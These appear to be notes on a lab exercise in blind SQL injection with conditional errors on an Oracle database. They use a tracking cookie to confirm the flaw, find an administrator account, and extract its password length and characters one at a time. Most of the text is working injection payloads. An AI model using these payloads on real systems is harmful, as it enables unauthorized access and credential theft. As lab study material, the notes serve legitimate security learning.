Lab #12 - Blind SQL Injection with conditional errors

Vulnerable parameter - Tracking Cookie

End Goals:

- Obatain the password of administrator
- Login as administrator user

Analysis:

1. Confirm the parameter is vulnerable

   g31CW6mjktuq8Zkd' || (select '' from dual) || ' -> `200 OK response` -> `oracle database`

2. Confirm that the users table exists in database

   g31CW6mjktuq8Zkd' || (select '' from users where rownum=1) || ' -> `200 OK response` -> `users table exists`

3. Confirm that the user 'administrator' exists

   g31CW6mjktuq8Zkd' || (select '' from users where username='administrator') || ' -> returns **200 OK response**, no matter what (even if the administrator user doesn't exist)

   so we need to generate an error if the user exists...

   g31CW6mjktuq8Zkd' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || ' -> `gives 500 Internal Error` -> `user administrator exists`

4. Determine the length of password for the 'administrator'

   g31CW6mjktuq8Zkd' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND LENGTH(password)>=1) || ' -> `gives 500 Internal Error` -> `password greater than 1 char` -> `password = 20 characters`

5. Determine the password for the 'administrator'

   g31CW6mjktuq8Zkd' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND SUBSTR(password,`1`,1)='`a`') || ' -> `gives 500 Internal Error if` **1st** `char is` **a**

   
